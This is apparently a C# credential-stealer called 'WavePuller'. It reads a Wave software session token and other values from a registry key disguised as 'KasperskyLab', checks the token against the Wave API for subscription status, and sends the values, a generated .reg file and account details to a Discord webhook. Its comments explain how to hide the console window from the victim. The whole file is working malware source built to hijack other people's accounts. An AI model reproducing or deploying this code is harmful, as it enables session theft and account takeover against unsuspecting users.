using Microsoft.Win32;
using Newtonsoft.Json;
using RestSharp;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace WavePuller
{
    internal class Program
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("Kernel32")]
        private static extern IntPtr GetConsoleWindow();

        const int SW_HIDE = 0;
        const int SW_SHOW = 5; // this will make the console invisible, you also need to go to project properties and change it from a console application to a windows application

        private static User user;

        static readonly RestClient Client = new RestClient("https://api.getwave.gg/v1", null, null, null);

        static async System.Threading.Tasks.Task Main(string[] args)
        {
            string registryPath = @"SOFTWARE\KasperskyLab";
            Dictionary<string, string> registryValues = ReadRegistryKey(registryPath);
            string Valid = "failed";
            string Premium = "Invalid Session";
            string durr = "No Subscription"; // subscription date (doesnt automatically translate to english, so a log might be in a different language)
            var data4 = new Dictionary<string, string>();
            try
            {
                user = await GetUserAsync(ReadSessionKeyFromRegistry(@"SOFTWARE\\KasperskyLab"));
                Valid = "True";
                Product product;
                if ((product = user.Products.FirstOrDefault((Product x) => x.Name == "premium-wave")) == null)
                {
                    product = user.Products.FirstOrDefault((Product x) => x.Name == "freemium-wave") ?? null;
                }
                if (product != null)
                {
                    durr = DateTimeOffset.FromUnixTimeMilliseconds(product.Timestamp).UtcDateTime.ToString("MMMM dd, yyyy");
                }
                if (product == null)
                {
                    Premium = "None";
                    goto ballsack;
                }
                if (product.Name.Contains("freemium"))
                {
                    Premium = "Freemium";
                    goto ballsack;
                }
                if (product.Name.Contains("premium"))
                {
                    Premium = "Premium";
                    goto ballsack;
                }
            }
            catch (Exception ex)
            {
                if (ex.ToString().Contains("session"))
                {
                    Valid = "False";
                }
            }
        ballsack:
            data4 = new Dictionary<string, string>
            {
                { 
                    "Valid Session?",
                    Valid
                },
                {
                    "Subscription",
                    Premium
                },
                {
                    "Duration",
                    durr
                }
            };
            if (registryValues.Count > 0)
            {
                string regFilePath = "Wave.reg";
                CreateRegFile(regFilePath, registryPath, registryValues);

                string webhookUrl = ""; // webhook to send the log to (discord specifically)
                await SendToWebhook(webhookUrl, registryValues, regFilePath, data4);
            }
            return;
        }


        static void CreateRegFile(string filePath, string registryPath, Dictionary<string, string> values)
        {
            using (StreamWriter writer = new StreamWriter(filePath, false, Encoding.Unicode))
            {
                writer.WriteLine("Windows Registry Editor Version 5.00");
                writer.WriteLine();
                writer.WriteLine($"[HKEY_CURRENT_USER\\{registryPath}]");

                foreach (var kvp in values)
                {
                    writer.WriteLine($"\"{kvp.Key}\"=\"{kvp.Value}\"");
                }
            }
        }

        static Dictionary<string, string> ReadRegistryKey(string path)
        {
            Dictionary<string, string> values = new Dictionary<string, string>();

            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(path))
                {
                    if (key != null)
                    {
                        foreach (string valueName in key.GetValueNames())
                        {
                            if (!ShouldExclude(valueName))
                            {
                                object value = key.GetValue(valueName);
                                values.Add(valueName, value?.ToString() ?? "null");
                            }
                        }
                    }
                }
            }
            catch (Exception)
            {
                // exceptionj code 
            }

            return values;
        }

        static bool ShouldExclude(string valueName)
        {
            // these are excldued, like useless keys in the registry
            string[] excludedKeys = {
                "ContinueOnStartUp",
                "TopMost",
                "RedirectCompilerError",
                "UsePerformanceMode",
                "RefreshRate",
                "FontSize",
                "Minimap",
                "InlayHints",
                "SendCurrentDocument",
                "FirstHash",
                "SecondHash"
            };

            return excludedKeys.Contains(valueName);
        }

        static string ReadSessionKeyFromRegistry(string path)
        {
            string sessionKey = null;

            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(path))
                {
                    if (key != null)
                    {
                        sessionKey = key.GetValue("Session")?.ToString();
                    }
                }
            }
            catch (Exception)
            {

            }

            return sessionKey;
        }

        static async System.Threading.Tasks.Task SendToWebhook(string url, Dictionary<string, string> data, string filePath, Dictionary<string, string> mebrd)
        {
            var embed = new
            {
                title = "Wave Account Information",
                fields = data.Select(kvp => new { name = kvp.Key, value = kvp.Value }).ToList()
            };

            var embed1 = new
            {
                title = "Account",
                fields = mebrd.Select(kvp => new { name = kvp.Key, value = kvp.Value }).ToList()
            };

            var payload = new
            {
                embeds = new[] { embed, embed1 }
            };

            using (HttpClient client = new HttpClient())
            {
                MultipartFormDataContent form = new MultipartFormDataContent();
                var json = JsonConvert.SerializeObject(payload);
                form.Add(new StringContent(json, Encoding.UTF8, "application/json"), "payload_json");

                using (FileStream fs = File.OpenRead(filePath))
                {
                    var streamContent = new StreamContent(fs);
                    streamContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
                    form.Add(streamContent, "file", Path.GetFileName(filePath));
                    try
                    {
                        HttpResponseMessage response = await client.PostAsync(url, form);
                    }
                    catch (Exception)
                    {

                    }
                }
            }
        }

        public static async Task<User> GetUserAsync(string session)
        {
            RestRequest restRequest = RestRequestExtensions.AddHeader(new RestRequest("user", 0), "Authorization", session);
            RestResponse restResponse = await Client.ExecuteAsync(restRequest, default(CancellationToken));
            if (restResponse.StatusCode == (HttpStatusCode)429)
            {
                throw new Exception("You have exceeded the rate limit of requests. Please try again later.");
            }
            if (restResponse.StatusCode != HttpStatusCode.OK)
            {
                WaveInterface.ThrowError(restResponse.Content);
            }
            return JsonConvert.DeserializeObject<User>(restResponse.Content);
        }
    }

    class Product
    {
        [JsonProperty("uuid")]
        public string Id { get; set; }

        [JsonProperty("expiration")]
        public long Timestamp { get; set; }

        [JsonProperty("product")]
        public string Name { get; set; }
    }

    class User
    {
        [JsonProperty("id")]
        public string Id { get; set; }

        [JsonProperty("products")]
        public List<Product> Products { get; set; }
    }

    class ErrorResponse
    {
        [JsonProperty("code")]
        public string Code { get; set; }

        [JsonProperty("message")]
        public string Error { get; set; }

        [JsonProperty("userFacingMessage")]
        public string Message { get; set; }
    }

    public static class WaveInterface
    {
        internal static ErrorResponse ParseError(string error)
        {
            ErrorResponse errorResponse;
            try
            {
                errorResponse = JsonConvert.DeserializeObject<ErrorResponse>(error);
            }
            catch
            {
                throw new Exception("Unable to establish a connection with the servers.");
            }
            return errorResponse;
        }

        internal static string GetError(ErrorResponse error)
        {
            string code = error.Code;
            if (code != null)
            {
                switch (code.Length)
                {
                    case 10:
                        if (code == "token#0001")
                        {
                            return "Your current session has become invalid. Please log in again.";
                        }
                        break;
                }
            }
            return error.Message ?? "An unknown error has occurred. Please try again later.";
        }

        public static void ThrowError(string content)
        {
            throw new Exception(WaveInterface.GetError(WaveInterface.ParseError(content)));
        }
    }
}

